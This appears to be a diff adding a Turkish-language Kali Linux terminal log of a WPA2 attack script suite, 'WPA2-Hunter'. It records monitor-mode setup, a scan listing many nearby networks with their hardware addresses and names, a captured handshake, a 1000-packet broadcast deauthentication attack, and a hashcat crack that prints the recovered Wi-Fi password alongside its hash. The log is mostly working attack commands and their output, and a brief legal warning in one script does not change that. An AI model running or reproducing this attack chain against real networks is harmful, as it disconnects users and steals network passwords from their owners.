@@ -1,0 +1,532 @@
+┌──(kali㉿kali)-[~/Desktop/WPA2-Hunter]
+└─$ cd scripts 
+                                                                                                                                                                                                                                                                                                 
+┌──(kali㉿kali)-[~/Desktop/WPA2-Hunter/scripts]
+└─$ ls
+00-cleanup.sh  01-setup-monitor-mode.sh  02-scan-networks.sh  03-capture-handshake.sh  04-deauth-attack.sh  05-crack-password.sh
+                                                                                                                                                                                                                                                                                                 
+┌──(kali㉿kali)-[~/Desktop/WPA2-Hunter/scripts]
+└─$ sudo ./00-cleanup.sh          
+[sudo] password for kali: 
+========================================
+   WPA2-Hunter - Sistem Temizliği
+========================================
+
+[*] Çalışan işlemler durduruluyor...
+[*] Monitor mode kapatılıyor...
+
+Requested device "wlan0mon" does not exist.
+Run /usr/sbin/airmon-ng without any arguments to see available interfaces
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           rtw88_8822bu    Realtek Semiconductor Corp. RTL88x2bu [AC1200 Techkey]
+
+You are trying to stop a device that isn't in monitor mode.
+Doing so is a terrible idea, if you really want to do it then you
+need to type 'iw wlan0 del' yourself since it is a terrible idea.
+Most likely you want to remove an interface called wlan[0-9]mon
+If you feel you have reached this warning in error,
+please report it.
+[*] NetworkManager yeniden başlatılıyor...
+[*] Geçici dosyalar temizleniyor...
+
+✅ Temizlik tamamlandı!
+
+[*] Şimdi saldırıya başlayabilirsiniz:
+    sudo ./01-setup-monitor-mode.sh
+
+                                                                                                                                                                                                                                                                                                 
+┌──(kali㉿kali)-[~/Desktop/WPA2-Hunter/scripts]
+└─$ sudo ./01-setup-monitor-mode.sh 
+========================================
+   WPA2-Hunter - Monitor Mode Kurulum
+========================================
+
+[*] WiFi interface'leri tespit ediliyor...
+
+wlan0     IEEE 802.11  ESSID:off/any  
+
+[?] WiFi interface adını girin (örn: wlan0): wlan0
+
+[*] Interface: wlan0
+
+⚠️  UYARI: Bu işlem mevcut WiFi bağlantınızı kesecektir!
+[?] Devam etmek istiyor musunuz? (e/h): e
+
+[*] Engelleyici servisler durduruluyor...
+
+Killing these processes:
+
+    PID Name
+   2752 wpa_supplicant
+
+
+[*] Monitor mode etkinleştiriliyor...
+
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           rtw88_8822bu    Realtek Semiconductor Corp. RTL88x2bu [AC1200 Techkey]
+                (monitor mode enabled)
+
+
+[*] Monitor mode doğrulanıyor...
+
+✅ Başarılı! Monitor mode aktif
+
+Monitor Interface: wlan0
+
+wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
+          Retry short limit:7   RTS thr:off   Fragment thr:off
+          Power Management:on
+
+[*] Artık ağ taramasına geçebilirsiniz:
+    sudo ./02-scan-networks.sh
+
+[*] Interface bilgisi kaydedildi: /tmp/wpa2hunter_interface.conf
+                                                                                                                                                                                                                                                                                                 
+┌──(kali㉿kali)-[~/Desktop/WPA2-Hunter/scripts]
+└─$ sudo ./02-scan-networks.sh     
+======================================
+   WPA2-Hunter - Ağ Tarama
+======================================
+
+[*] Kaydedilmiş interface bulundu: wlan0
+
+[*] Ağ taraması başlatılıyor...
+[*] Kapatmak için Ctrl+C basın
+
+📡 Çıktıda arayacaklarınız:
+   - ENC: WPA2
+   - PWR: < -70 (yakın ağlar)
+   - #Data: > 0 (aktif ağlar)
+
+[*] Taranıyor.
+
+ CH 10 ][ Elapsed: 30 s ][ 2025-12-21 07:39 
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSI
+
+ 94:28:6F:0C:63:24  -108        3        0    0   9  360   WPA2 CCMP   PSK  SUP
+ E0:B6:68:BA:FA:F4  -89        2        0    0   8  360   WPA2 CCMP   PSK  SUPE
+ 6C:E8:73:A0:A0:E2  -105        0        4    0  11   -1   WPA              <le
+ 52:3D:D1:51:50:7D  -80       28        0    0   7  360   WPA2 CCMP   PSK  <len
+ FA:0D:A9:19:85:09  -57       28        0    0   5  130   WPA2 CCMP   PSK  <len
+ F8:0D:A9:89:85:09  -61       25        0    0   5  130   WPA2 CCMP   PSK  Fibe
+ 52:3D:D1:41:50:7D  -81       22        0    0   7  360   WPA2 CCMP   PSK  <len
+ 50:3D:D1:71:50:7D  -75       18        0    0   7  360   WPA2 CCMP   PSK  SUPE
+ FA:0D:A9:39:85:09  -60       20        0    0   5  130   WPA2 CCMP   PSK  <len
+ FA:0D:A9:29:85:09  -66       11        0    0   5  130   WPA2 CCMP   PSK  <len
+ FC:11:93:D3:F4:83  -73       54        0    0   1  400   WPA2 CCMP   PSK  Fibe
+ 46:41:C9:D8:13:29  -41       60       11    0   1  360   WPA2 CCMP   PSK  CRYP
+ 28:77:77:B9:45:60  -48       72        4    0   3  130   WPA2 CCMP   PSK  Fibe
+ 14:09:B4:CB:AA:89  -77       37        0    0   3  130   WPA2 CCMP   PSK  Fibe
+ F4:2D:06:09:66:3A  -73       32        0    0  10  360   WPA2 CCMP   PSK  Fibe
+ DC:21:E2:14:ED:DC  -82       20        0    0  11  400   WPA2 CCMP   PSK  SUPE
+ 64:DD:68:3C:CA:A1  -70       46        0    0  10  130   WPA2 CCMP   PSK  SUPE
+
+Quitting...
+
+
+
+======================================
+   Tespit Edilen WPA2 Ağları
+======================================
+
+BSSID: 64:DD:68:3C:CA:A1
+ESSID: SUPERONLINE_Wi-Fi_3492
+Channel:  10
+Power:  -70 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: DC:21:E2:14:ED:DC
+ESSID: SUPERONLINE_WiFi_38A3
+Channel:  11
+Power:  -82 dBm
+Encryption:  WPA2 WPA /  CCMP TKIP /  PSK
+---
+BSSID: F4:2D:06:09:66:3A
+ESSID: FiberHGW_ZTX4DT
+Channel:  10
+Power:  -73 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: 14:09:B4:CB:AA:89
+ESSID: FiberHGW_ZT6ZE6_2.4GHz
+Channel:   3
+Power:  -77 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: 28:77:77:B9:45:60
+ESSID: FiberHGW_ZTNYF6_2.4GHz
+Channel:   3
+Power:  -48 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: 46:41:C9:D8:13:29
+ESSID: CRYPTO
+Channel:   1
+Power:  -41 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: FC:11:93:D3:F4:83
+ESSID: FiberHGW_HUI1VN
+Channel:   1
+Power:  -73 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: FA:0D:A9:29:85:09
+ESSID: (Hidden SSID)
+Channel:   5
+Power:  -66 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: FA:0D:A9:39:85:09
+ESSID: (Hidden SSID)
+Channel:   5
+Power:  -60 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: 50:3D:D1:71:50:7D
+ESSID: SUPERONLINE_Wi-Fi_507D
+Channel:   7
+Power:  -75 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: 52:3D:D1:41:50:7D
+ESSID: (Hidden SSID)
+Channel:   7
+Power:  -81 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: F8:0D:A9:89:85:09
+ESSID: FiberHGW_ZY7475
+Channel:   5
+Power:  -61 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: FA:0D:A9:19:85:09
+ESSID: (Hidden SSID)
+Channel:   5
+Power:  -57 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: 52:3D:D1:51:50:7D
+ESSID: (Hidden SSID)
+Channel:   7
+Power:  -80 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: C0:FD:84:94:34:3C
+ESSID: SUPERONLINE_WiFi_6205
+Channel:  11
+Power:  -106 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: E0:B6:68:BA:FA:F4
+ESSID: SUPERONLINE_Wi-Fi_6R9Z
+Channel:   8
+Power:  -89 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+BSSID: 94:28:6F:0C:63:24
+ESSID: SUPERONLINE_Wi-Fi_3151
+Channel:   9
+Power:  -108 dBm
+Encryption:  WPA2 /  CCMP /  PSK
+---
+
+[*] Tarama tamamlandı.
+
+▶️  Hedef ağınızı belirlediyseniz, handshake yakalamaya geçin:
+    sudo ./03-capture-handshake.sh
+
+                                                                                                                                                                                                                                                                                                 
+┌──(kali㉿kali)-[~/Desktop/WPA2-Hunter/scripts]
+└─$ sudo ./03-capture-handshake.sh 
+================================================
+   WPA2-Hunter - Handshake Yakalama
+================================================
+
+[*] Monitor interface: wlan0
+
+🎯 Hedef Ağ Bilgileri
+---
+[?] Hedef BSSID (MAC adresi): 46:41:C9:D8:13:29
+[?] Hedef Kanal: 1
+[?] Çıktı dosya adı (örn: capture): cryptography
+
+📡 Yakalama Ayarları:
+   BSSID: 46:41:C9:D8:13:29
+   Kanal: 1
+   Dosya: ../captures/cryptography-01.cap
+
+⚠️  UYARI: Handshake yakalamak için:
+   1) Hedef ağa bağlı bir cihaz olmalı
+   2) Cihaz bağlantıyı yenilemeli (veya deauth saldırısı yapın)
+
+💡 İpucu: Handshake yakalanınca sağ üst köşede göreceksiniz:
+   [ WPA handshake: 46:41:C9:D8:13:29 ]
+
+▶️  Başka bir terminalde deauth saldırısı yapabilirsiniz:
+    sudo ./04-deauth-attack.sh
+
+[?] Yakalamayı başlatmak için Enter'a basın...
+
+[*] Paket yakalama başlatılıyor...
+[*] Durdurmak için Ctrl+C basın
+
+07:40:50  Created capture file "cryptography-01.cap".
+
+ CH  1 ][ Elapsed: 6 s ][ 2025-12-21 07:40 
+
+ CH  1 ][ Elapsed: 1 min ][ 2025-12-21 07:41 ][ WPA handshake: 46:41:C9:D8:13:29 
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 46:41:C9:D8:13:29  -46  38      103       48    0   1  360   WPA2 CCMP   PSK  CRYPTO                                                                                                                                                                                            
+
+ BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes
+
+ 46:41:C9:D8:13:29  F8:3D:C6:DD:70:E0  -30    1e- 6e     0       65  EAPOL  CRYPTO                                                                                                                                                                                                
+Quitting...
+
+[*] Yakalama durduruldu.
+
+[*] Handshake doğrulama yapılıyor...
+
+✅ BAŞARILI! Handshake yakalandı!
+
+📁 Dosya: ../captures/cryptography-01.cap
+
+▶️  Şimdi parola kırmaya geçebilirsiniz:
+    sudo ./05-crack-password.sh
+
+                                                                                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~/Desktop/WPA2-Hunter/scripts]
+└─$ sudo ./05-crack-password.sh   
+================================================
+   WPA2-Hunter - Parola Kırma
+================================================
+
+[*] Handshake .cap dosyasını seçin
+
+Mevcut .cap dosyaları:
+---
+-rw-r--r-- 1 root root 8.4M Dec 21 07:32 ../captures/crypto-01.cap
+-rw-r--r-- 1 root root 455K Dec 21 07:41 ../captures/cryptography-01.cap
+
+[?] .cap dosya yolu: ../captures/cryptography-01.cap
+
+[*] Handshake doğrulanıyor...
+
+[*] Hedef BSSID'yi belirleyin
+[*] Kaydedilmiş: 46:41:C9:D8:13:29
+[?] Kullanılsın mı? (e/h): e
+
+📚 Wordlist Seçimi
+---
+  1) Rockyou.txt (~14M parola - önerilen)
+  2) Özel wordlist dosyası
+  3) Crunch ile anlık oluştur
+
+[?] Seçiminiz (1/2/3): 1
+[*] Wordlist: /usr/share/wordlists/rockyou.txt
+
+[*] Wordlist bilgileri:
+   Dosya: /usr/share/wordlists/rockyou.txt
+   Satır sayısı: 14344392
+
+🔓 Kırma Yöntemi:
+---
+  1) Aircrack-ng (CPU - ~1,000 key/s)
+  2) Hashcat (GPU - ~100,000+ key/s) [Önerilen]
+
+[?] Seçiminiz (1/2): 2
+
+⏳ Parola kırma başlatılıyor...
+
+[*] .cap dosyası hashcat formatına dönüştürülüyor...
+hcxpcapngtool 6.3.5 reading from cryptography-01.cap...
+
+summary capture file
+--------------------
+file name................................: cryptography-01.cap
+version (pcap/cap).......................: 2.4 (very basic format without any additional information)
+timestamp minimum (timestamp)............: 21.12.2025 12:40:50 (1766320850)
+timestamp maximum (timestamp)............: 21.12.2025 12:41:56 (1766320916)
+duration of the dump tool (minutes)......: 1
+used capture interfaces..................: 1
+link layer header type...................: DLT_IEEE802_11 (105) very basic format without any additional information about the quality
+endianness (capture system)..............: little endian
+packets inside...........................: 11391
+ESSID (total unique).....................: 1
+BEACON (total)...........................: 1
+BEACON on 2.4 GHz channel (from IE_TAG)..: 1 
+ACTION (total)...........................: 3
+PROBEREQUEST (directed)..................: 1
+PROBERESPONSE (total)....................: 10
+DEAUTHENTICATION (total).................: 8281
+AUTHENTICATION (total)...................: 8
+AUTHENTICATION (OPEN SYSTEM).............: 8
+ASSOCIATIONREQUEST (total)...............: 2
+ASSOCIATIONREQUEST (PSK).................: 2
+WPA encrypted............................: 40
+EAPOL messages (total)...................: 8
+EAPOL RSN messages.......................: 8
+EAPOLTIME gap (measured maximum msec)....: 5607
+EAPOL ANONCE error corrections (NC)......: not detected
+EAPOL M1 messages (total)................: 2
+EAPOL M2 messages (total)................: 2
+EAPOL M3 messages (total)................: 4
+EAPOL pairs (total)......................: 6
+EAPOL pairs (best).......................: 1
+EAPOL pairs written to 22000 hash file...: 1 (RC checked)
+EAPOL M12E2 (challenge)..................: 1
+
+Information: limited dump file format detected!
+This file format is a very basic format to save captured network data.
+It is recommended to use PCAP Next Generation dump file format (or pcapng for short) instead. The PCAP Next Generation dump file format is an attempt to overcome the limitations of the currently widely used (but very limited) libpcap (cap, pcap) format.
+https://www.wireshark.org/docs/wsug_html_chunked/AppFiles.html#ChAppFilesCaptureFilesSection
+https://github.com/pcapng/pcapng
+
+Information: radiotap header is missing!
+Radiotap is a de facto standard for 802.11 frame injection and reception. The radiotap header format is a mechanism to supply additional information about frames, from the driver to userspace applications.
+https://www.radiotap.org/
+
+Warning: too many deauthentication/disassociation frames detected!
+That can cause that an ACCESS POINT change channel, reset EAPOL TIMER, renew ANONCE and set PMKID to zero. This could prevent to calculate a valid EAPOL MESSAGE PAIR, to get a valid PMKID or to decrypt the traffic.
+
+Information: missing frames!
+This dump file does not contain undirected proberequest frames.
+An undirected proberequest may contain information about the PSK. It always happens if the capture file was cleaned or it could happen if filter options are used during capturing.
+That makes it hard to recover the PSK.
+
+
+session summary
+---------------
+processed cap files...................: 1
+
+[*] Hashcat ile kırma başlatıldı (WPA2 mode 22000)
+---
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-sandybridge-AMD Ryzen 9 9955HX 16-Core Processor, 6970/13940 MB (2048 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 8
+Maximum password length supported by kernel: 63
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+INFO: All hashes found as potfile and/or empty entries! Use --show to display them.
+      For more information, see https://hashcat.net/faq/potfile
+
+Started: Sun Dec 21 07:42:38 2025
+Stopped: Sun Dec 21 07:42:38 2025
+
+[*] Bulunan parolalar:
+40bcf8fa666e95cb5861fd23f3f6deb4:4641c9d81329:f83dc6dd70e0:CRYPTO:qwerty123
+
+[*] İşlem tamamlandı.
+
+                                                                                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~/Desktop/WPA2-Hunter/scripts]
+└─$ 
+
+diger terminal 
+
+┌──(kali㉿kali)-[~/Desktop/WPA2-Hunter]
+└─$ sudo ./04-deauth-attack.sh
+                                                                                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~/Desktop/WPA2-Hunter]
+└─$ cd scripts 
+                                                                                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~/Desktop/WPA2-Hunter/scripts]
+└─$ ls
+00-cleanup.sh  01-setup-monitor-mode.sh  02-scan-networks.sh  03-capture-handshake.sh  04-deauth-attack.sh  05-crack-password.sh
+                                                                                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~/Desktop/WPA2-Hunter/scripts]
+└─$ sudo ./04-deauth-attack.sh    
+[sudo] password for kali: 
+================================================
+   WPA2-Hunter - Deauth Saldırısı
+================================================
+
+[*] Monitor interface: wlan0
+
+⚠️  ETİK VE YASAL UYARI
+───────────────────────────────────────────────
+Bu saldırı, ağa bağlı cihazların bağlantısını
+geçici olarak keser. Yalnızca:
+  - Kendi ağınızda
+  - Yazılı izniniz olan ağlarda
+kullanın. İzinsiz kullanım YASA DIŞIDIR!
+───────────────────────────────────────────────
+
+[?] Yasal ve etik sorumluluğu kabul ediyor musunuz? (EVET/hayir): EVET
+
+[*] Kaydedilmiş hedef bulundu: 46:41:C9:D8:13:29
+[?] Bu hedefi kullanmak istiyor musunuz? (e/h): e
+
+Saldırı Tipi Seçimi:
+  1) Belirli bir istemciyi hedefle (önerilen)
+  2) Tüm istemcilere broadcast deauth
+
+[?] Seçiminiz (1/2): 2
+[?] Kaç adet deauth paketi gönderilsin? (varsayılan 5): 1000
+
+🎯 Saldırı Parametreleri:
+   AP: 46:41:C9:D8:13:29 (Tüm istemciler)
+   Interface: wlan0
+
+⏳ Deauth paketleri gönderiliyor...
+
+07:41:28  Waiting for beacon frame (BSSID: 46:41:C9:D8:13:29) on channel 1
+NB: this attack is more effective when targeting
+a connected wireless client (-c <client's mac>).
+07:41:30  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:30  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:31  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:32  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:32  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:33  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:34  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:34  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:35  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:36  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:36  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:37  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:38  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:38  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:39  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:40  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:40  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:41  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:41  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:42  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:42  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:43  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:43  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:44  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:44  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:45  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:46  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:46  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:47  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:47  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:48  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:48  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:49  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:49  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:50  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:51  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:51  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:52  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+07:41:52  Sending DeAuth (code 7) to broadcast -- BSSID: [46:41:C9:D8:13:29]
+^C
+                                                                                                                                                                                                                                                                                  
+┌──(kali㉿kali)-[~/Desktop/WPA2-Hunter/scripts]
+└─$ 
